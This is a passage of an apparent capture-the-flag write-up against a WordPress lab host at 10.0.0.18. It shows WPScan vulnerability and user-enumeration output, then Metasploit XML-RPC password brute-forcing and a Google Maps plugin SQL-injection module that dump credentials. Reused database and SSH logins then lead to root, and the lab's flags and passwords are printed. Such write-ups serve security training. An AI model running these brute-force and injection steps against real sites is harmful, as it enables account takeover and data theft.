    |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
    |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
    |     Fixed in: 5.2.16
    |     References:
    |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
    |     Fixed in: 5.2.16
    |     References:
    |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - SQLi via Link API
    |     Fixed in: 5.2.16
    |     References:
    |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
    |
    | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
    |
    | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
    |
    | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
    |
    | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
    |
    | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
    |
    | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
    |
    | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
    |
    | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
    |     Fixed in: 5.2.17
    |     References:
    |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/gutenberg/pull/45045/files
    |
    | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
    |     References:
    |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
    |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
    |
    | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
    |     Fixed in: 5.2.18
    |     References:
    |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
    |
    | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
    |     Fixed in: 5.2.18
    |     References:
    |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
    |
    | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
    |     Fixed in: 5.2.18
    |     References:
    |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
    |
    | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
    |     Fixed in: 5.2.18
    |     References:
    |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
    |
    | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
    |     Fixed in: 5.2.18
    |     References:
    |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
    |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
    |
    | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
    |     Fixed in: 5.2.19
    |     References:
    |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
    |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
    |
    | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
    |     Fixed in: 5.2.19
    |     References:
    |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
    |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
    |
    | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
    |     Fixed in: 5.2.19
    |     References:
    |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
    |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
    |
    | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
    |     Fixed in: 5.2.19
    |     References:
    |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
    |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
    |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
    |
    | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
    |     Fixed in: 5.2.20
    |     References:
    |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
    |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
    |
    | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
    |     Fixed in: 5.2.20
    |     References:
    |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
    |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
    |
    | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
    |     Fixed in: 5.2.21
    |     References:
    |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
    |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
    |
    | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
    |     Fixed in: 5.2.21
    |     References:
    |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
    |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
    |
    | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
    |     Fixed in: 5.2.21
    |     References:
    |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
    |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
    |
    | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
    |     Fixed in: 5.2.23
    |     References:
    |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
    |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
    |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
    |
    | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
    |     Fixed in: 5.2.23
    |     References:
    |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
    |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
    |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

    [+] WordPress theme in use: twentyseventeen
    | Location: http://10.0.0.18/wp-content/themes/twentyseventeen/
    | Last Updated: 2025-04-15T00:00:00.000Z
    | Readme: http://10.0.0.18/wp-content/themes/twentyseventeen/README.txt
    | [!] The version is out of date, the latest version is 3.9
    | Style URL: http://10.0.0.18/wp-content/themes/twentyseventeen/style.css?ver=5.2.3
    | Style Name: Twenty Seventeen
    | Style URI: https://wordpress.org/themes/twentyseventeen/
    | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
    | Author: the WordPress team
    | Author URI: https://wordpress.org/
    |
    | Found By: Css Style In Homepage (Passive Detection)
    |
    | Version: 2.2 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - http://10.0.0.18/wp-content/themes/twentyseventeen/style.css?ver=5.2.3, Match: 'Version: 2.2'

    [+] Enumerating Users (via Passive and Aggressive Methods)
    Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================> (10 / 10) 100.00% Time: 00:00:00

    [i] User(s) Identified:

    [+] webmaster
    | Found By: Author Posts - Display Name (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

    [+] WPScan DB API OK
    | Plan: free
    | Requests Done (during the scan): 0
    | Requests Remaining: 22

    [+] Finished: Sat Nov 15 05:42:53 2025
    [+] Requests Done: 26
    [+] Cached Requests: 40
    [+] Data Sent: 6.434 KB
    [+] Data Received: 129.054 KB
    [+] Memory used: 163.383 MB
    [+] Elapsed time: 00:00:02

```

## Attempts

### Metasploit

#### wordpress_xmlrpc_login attempt

```bash
    msf auxiliary(scanner/http/wordpress_xmlrpc_login) > show options

    Module options (auxiliary/scanner/http/wordpress_xmlrpc_login):

    Name              Current Setting                   Required  Description
    ----              ---------------                   --------  -----------
    ANONYMOUS_LOGIN   false                             yes       Attempt to login with a blank username and password
    BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
    DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
    DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
    DB_ALL_USERS      false                             no        Add all users in the current database to the list
    DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
    PASSWORD                                            no        A specific password to authenticate with
    PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
    Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, ht
                                                                    tp, socks5h
    RHOSTS                                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT             80                                yes       The target port (TCP)
    SSL               false                             no        Negotiate SSL/TLS for outgoing connections
    STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
    TARGETURI         /                                 yes       The base path to the wordpress application
    THREADS           1                                 yes       The number of concurrent threads (max one per host)
    USERNAME          webmaster                         no        A specific username to authenticate as
    USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
    USER_AS_PASS      false                             no        Try the username as the password for all users
    USER_FILE                                           no        File containing usernames, one per line
    VERBOSE           true                              yes       Whether to print output for all attempts
    VHOST                                               no        HTTP server virtual host

    # After many attempts, we got
    [+] 10.0.0.18:80 - Success: 'webmaster:kittykat1'
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```

#### auxiliary/admin/http/wp_google_maps_sqli

```bash
    msf auxiliary(admin/http/wp_google_maps_sqli) > show options

    Module options (auxiliary/admin/http/wp_google_maps_sqli):

    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    DB_PREFIX  wp_              yes       WordPress table prefix
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
    RHOSTS     10.0.0.18        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT      80               yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       The base path to the wordpress application
    VHOST                       no        HTTP server virtual host

    # Result
    [*] Running module against 10.0.0.18
    [*] 10.0.0.18:80 - Trying to retrieve the wp_users table...
    [+] Credentials saved in: /root/.msf4/loot/20251115060259_default_10.0.0.18_wp_google_maps.j_211695.bin
    [+] 10.0.0.18:80 - Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local
    [*] Auxiliary module execution completed
```

We can now go to `http://10.0.0.18/wp-login.php` and put the user login

### FTP

### DB Connect

DOES NOT WORK

We get the db information from `./others/wp-config.php`

```bash
    $ mysql -h localhost -u wordpress -p'nvwtlRqkD0E1jBXu' -e "SHOW * FROM wordpress"
    ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
```


### SSH

Use webmaster:kittykat1 to connect to the SSH session and here we have the first `flag.txt` and have the flag

#### User flag

`83cad236438ff0c0dbce55d7f0034aee18f5c39e`

#### Root flag

Now we can connect to the mysql database using

```bash
    $ mysql -h localhost -u wordpress -p'nvwtlRqkD0E1jBXu' -e "SHOW TABLES FROM wordpress;"

    +-------------------------+
    | Tables_in_wordpress     |
    +-------------------------+
    | wp_commentmeta          |
    | wp_comments             |
    | wp_links                |
    | wp_options              |
    | wp_postmeta             |
    | wp_posts                |
    | wp_term_relationships   |
    | wp_term_taxonomy        |
    | wp_termmeta             |
    | wp_terms                |
    | wp_usermeta             |
    | wp_users                |
    | wp_wpgmza               |
    | wp_wpgmza_categories    |
    | wp_wpgmza_category_maps |
    | wp_wpgmza_circles       |
    | wp_wpgmza_maps          |
    | wp_wpgmza_polygon       |
    | wp_wpgmza_polylines     |
    | wp_wpgmza_rectangles    |
    +-------------------------+

    $ mysql -h localhost -u wordpress -p'nvwtlRqkD0E1jBXu' -e "SELECT * FROM wordpress.wp_users;"
    # We get the info we already had
```
We now can simply do a sudo su, put `kittykat1` as the password and we get the root flag
`3dcdf93d2976321d7a8c47a6bb2d48837d330624`